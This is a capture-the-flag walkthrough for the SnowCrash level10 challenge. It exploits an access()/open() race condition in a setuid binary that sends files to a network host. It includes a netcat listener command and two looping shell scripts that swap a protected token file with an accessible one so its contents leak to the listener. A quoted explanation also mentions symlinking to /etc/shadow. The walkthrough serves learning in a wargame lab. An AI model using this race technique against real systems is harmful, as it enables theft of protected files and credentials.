## Walkthrough :

+ i started by executing **./level10**, this prints the usage 
```
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
```
+ tryied **strings level10** , the server is trying to connect to a host in 6969 port.
+ launched **netstat -l** the port wasn't open. so i opened it using :
```
nc -lk 6969
```
* i noticed the use of **access function** which gives the possiblity of a security hole.
	##### Description from stackexchange:
	+ *It is a race condition. You do the access(), then you do the open(). In the small time between the two calls, the file may have changed. Typically, the file is, say, /tmp/foo. Initially, the file is owned by some user (who is the bad guy of the story), and the target is some root-powered application. The application does the access(), sees that the file really belongs to the user, and thus thinks: "that's fine, it's his file, I can process it on his behalf". Then the bad guy quickly replaces the file with a symbolic link to /etc/shadow. The application has already taken the decision to open /tmp/foo, but when it does, it really opens and processes /etc/shadow*

+ i did two scripts : 
	+ the first to shift between 3 files (token , and two random files), 
	+ the second to send in loop a file i have access.
```
#!/bin/sh

while true
do
	mv token tmp
	mv file token
	mv tmp file
done
```

```
#!/bin/sh

while true
do
	./level10 file 0.0.0.0
done
```


## Ressources :
+ [race condition](https://web.ecs.syr.edu/\~wedu/Teaching/IntrCompSec/LectureNotes_New/Race_Condition.pdf)  
+ [access() Security Hole](https://stackoverflow.com/questions/7925177/access-security-hole)